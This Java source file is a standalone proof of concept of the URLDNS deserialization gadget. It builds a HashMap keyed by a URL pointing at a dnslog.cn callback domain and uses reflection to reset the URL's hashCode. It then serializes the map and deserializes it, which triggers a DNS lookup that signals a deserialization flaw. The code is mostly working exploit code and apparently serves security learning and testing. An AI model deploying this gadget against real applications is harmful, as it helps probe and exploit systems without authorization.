package org.h3rmesk1t.URLDNS;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

public class URLDemo {

    public static void main(String[] args) throws Exception {
        Date nowTime = new Date();
        HashMap hashmap = new HashMap();
        URL url = new URL("http://lttx9f.dnslog.cn");
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
        filed.set(url, 209);
        hashmap.put(url, 209);
        System.out.println("当前时间为: " + simpleDateFormat.format(nowTime));
        filed.set(url, -1);

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./dnsser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./dnsser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
